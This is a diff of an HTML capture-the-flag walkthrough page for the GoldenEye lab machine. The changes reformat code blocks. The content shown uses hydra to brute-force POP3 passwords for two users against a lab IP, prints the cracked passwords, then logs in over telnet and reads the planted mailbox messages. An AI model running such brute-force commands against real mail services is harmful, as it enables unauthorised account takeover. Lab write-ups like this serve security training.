 <h4 id="fifth-lets-try-to-brute-force-the-service-by-using-hydra"><strong>Fifth</strong>, let's try to brute-force the service by using <a href="../hydra/">hydra</a>.</h4>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>boris<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>boris<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3
+</span></code></pre></div></td></tr></table></div>
 <p>And the results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-17 13:57:42
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>[DATA] attacking pop3://192.168.56.101:55007/
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>1 of 1 target successfully completed, 1 valid password found
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-17 14:00:19
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-9-10">10</a></span>
+<span class="normal"><a href="#__codelineno-9-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-17 13:57:42
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>[DATA] attacking pop3://192.168.56.101:55007/
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a>[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a>[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10"></a>1 of 1 target successfully completed, 1 valid password found
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-17 14:00:19
+</span></code></pre></div></td></tr></table></div>
 <p>We do the same for the user natalya.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>natalya<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>natalya<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3
+</span></code></pre></div></td></tr></table></div>
 <p>And the results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 13:45:18
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>[DATA] attacking pop3://192.168.56.101:55007/
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>[55007][pop3] host: 192.168.56.101   login: natalya   password: bird
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>1 of 1 target successfully completed, 1 valid password found
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-19 13:47:19
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">3</a></span>
+<span class="normal"><a href="#__codelineno-11-4">4</a></span>
+<span class="normal"><a href="#__codelineno-11-5">5</a></span>
+<span class="normal"><a href="#__codelineno-11-6">6</a></span>
+<span class="normal"><a href="#__codelineno-11-7">7</a></span>
+<span class="normal"><a href="#__codelineno-11-8">8</a></span>
+<span class="normal"><a href="#__codelineno-11-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 13:45:18
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>[DATA] attacking pop3://192.168.56.101:55007/
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a>[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>[55007][pop3] host: 192.168.56.101   login: natalya   password: bird
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8"></a>1 of 1 target successfully completed, 1 valid password found
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-19 13:47:19
+</span></code></pre></div></td></tr></table></div>
 <p>So now, we have these credentials for the dovecot pop3 service:</p>
 <ul>
 <li>user: boris</li>
@@ -17593,155 +17700,284 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <h4 id="sixth-lets-access-dovecot-pop3-service"><strong>Sixth</strong>, let's access dovecot pop3 service</h4>
 <p>We can use telnet as before:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>telnet<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span><span class="m">55007</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>telnet<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span><span class="m">55007</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Trying 192.168.56.101...
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Connected to 192.168.56.101.
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Escape character is &#39;^]&#39;.
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>+OK GoldenEye POP3 Electronic-Mail System
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>USER boris
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>+OK
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>PASS secret1!
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>+OK Logged in.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span>
+<span class="normal"><a href="#__codelineno-13-6">6</a></span>
+<span class="normal"><a href="#__codelineno-13-7">7</a></span>
+<span class="normal"><a href="#__codelineno-13-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>Trying 192.168.56.101...
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>Connected to 192.168.56.101.
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>Escape character is &#39;^]&#39;.
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>+OK GoldenEye POP3 Electronic-Mail System
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>USER boris
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a>+OK
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7"></a>PASS secret1!
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8"></a>+OK Logged in.
+</span></code></pre></div></td></tr></table></div>
 <p>Let's going to see all messages in our inbox:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># List messages in inbox
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>LIST
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a># List messages in inbox
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>LIST
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>+OK 3 messages:
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>1 544
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>2 373
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>3 921
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span>
+<span class="normal"><a href="#__codelineno-15-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>+OK 3 messages:
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>1 544
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>2 373
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a>3 921
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>.
+</span></code></pre></div></td></tr></table></div>
 <p>Now let's RETRIEVE all messages from inbox:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a># For retrieving first message:
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>RETR 1
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a># For retrieving second message:
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>RETR 2
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a># For retrieving third message:
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>RETR 3
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>
-</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a># For retrieving fourth message:
-</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>RETR 4
-</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
-</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a># There was no fifth message
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-16-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-16-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-16-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-16-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-16-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-16-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-16-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-16-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-16-10">10</a></span>
+<span class="normal"><a href="#__codelineno-16-11">11</a></span>
+<span class="normal"><a href="#__codelineno-16-12">12</a></span>
+<span class="normal"><a href="#__codelineno-16-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a># For retrieving first message:
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>RETR 1
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a># For retrieving second message:
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>RETR 2
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a># For retrieving third message:
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a>RETR 3
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10"></a># For retrieving fourth message:
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11"></a>RETR 4
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12"></a>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13"></a># There was no fifth message
+</span></code></pre></div></td></tr></table></div>
 <p>And messages are:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>RETR 1
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>+OK 544 octets
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>Return-Path: &lt;root@127.0.0.1.goldeneye&gt;
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>X-Original-To: boris
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>Delivered-To: boris@ubuntu
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>Received: from ok (localhost [127.0.0.1])
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>        by ubuntu (Postfix) with SMTP id D9E47454B1
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>From: root@127.0.0.1.goldeneye
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>Boris, this is admin. You can electronically communicate to co-workers and students here. I&#39;m not going to scan emails for security risks because I trust you and the other admins here.
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>.
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>RETR 2
-</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>+OK 373 octets
-</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>Return-Path: &lt;natalya@ubuntu&gt;
-</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>X-Original-To: boris
-</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>Delivered-To: boris@ubuntu
-</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>Received: from ok (localhost [127.0.0.1])
-</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>        by ubuntu (Postfix) with ESMTP id C3F2B454B1
-</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
-</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;
-</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
-</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>From: natalya@ubuntu
-</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>
-</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>Boris, I can break your codes!
-</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>.
-</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>RETR 3
-</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a>+OK 921 octets
-</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>Return-Path: &lt;alec@janus.boss&gt;
-</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>X-Original-To: boris
-</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>Delivered-To: boris@ubuntu
-</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>Received: from janus (localhost [127.0.0.1])
-</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
-</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a>        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;
-</span><span id="__span-17-38"><a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-</span><span id="__span-17-39"><a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a>From: alec@janus.boss
-</span><span id="__span-17-40"><a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a>
-</span><span id="__span-17-41"><a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>Boris,
-</span><span id="__span-17-42"><a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a>
-</span><span id="__span-17-43"><a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
-</span><span id="__span-17-44"><a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a>
-</span><span id="__span-17-45"><a id="__codelineno-17-45" name="__codelineno-17-45" href="#__codelineno-17-45"></a>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
-</span><span id="__span-17-46"><a id="__codelineno-17-46" name="__codelineno-17-46" href="#__codelineno-17-46"></a>
-</span><span id="__span-17-47"><a id="__codelineno-17-47" name="__codelineno-17-47" href="#__codelineno-17-47"></a>PS - Keep security tight or we will be compromised.
-</span><span id="__span-17-48"><a id="__codelineno-17-48" name="__codelineno-17-48" href="#__codelineno-17-48"></a>
-</span><span id="__span-17-49"><a id="__codelineno-17-49" name="__codelineno-17-49" href="#__codelineno-17-49"></a>.
-</span><span id="__span-17-50"><a id="__codelineno-17-50" name="__codelineno-17-50" href="#__codelineno-17-50"></a>RETR 5
-</span><span id="__span-17-51"><a id="__codelineno-17-51" name="__codelineno-17-51" href="#__codelineno-17-51"></a>-ERR There&#39;s no message 5.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-17-10">10</a></span>
+<span class="normal"><a href="#__codelineno-17-11">11</a></span>
+<span class="normal"><a href="#__codelineno-17-12">12</a></span>
+<span class="normal"><a href="#__codelineno-17-13">13</a></span>
+<span class="normal"><a href="#__codelineno-17-14">14</a></span>
